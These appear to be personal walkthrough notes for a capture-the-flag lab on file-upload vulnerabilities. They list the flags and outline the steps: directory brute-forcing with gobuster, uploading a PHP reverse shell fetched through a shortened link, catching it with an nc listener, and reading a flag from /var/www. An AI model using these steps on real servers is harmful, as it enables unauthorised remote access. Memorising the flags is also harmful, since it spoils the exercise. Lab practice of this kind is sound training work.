///TASK4/// - Overwriting Existing Files
Q: What is the name of the image file which can be overwritten?
** Page source > <img src="images/mountains.jpg" alt="">
A: mountains.jpg
===
Q:Overwrite the image. What is the flag you receive?
** IN CONSOLE: "touch mountains.jpg" (creates a file) > upload
A:THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}
===
///TASK6/// - Remote code execution
Q: What directory looks like it might be used for uploads?
** gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
A: /resources
===
Q: What's the flag in the /var/www/ directory of the server?
** INSONSOLE: "touch 3_shell" >> "nano 3_shell" > add the data from https://bit.ly/3Bks1M7 (UPDATE IT!!!) >> Upload file to http://shell.uploadvulns.thm/ >> IN CONSOLE: "nc -lvnp 1234" >> Open new tab in browser >> Navigate to http://shell.uploadvulns.thm/resources/3_shell.php > nc will be reverse shelled :)
 In Reverse shell: "ls" > "cd /var/www" > "cat flag.txt"
A: THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
///TASK7/// - 
Q:
**
A:
===
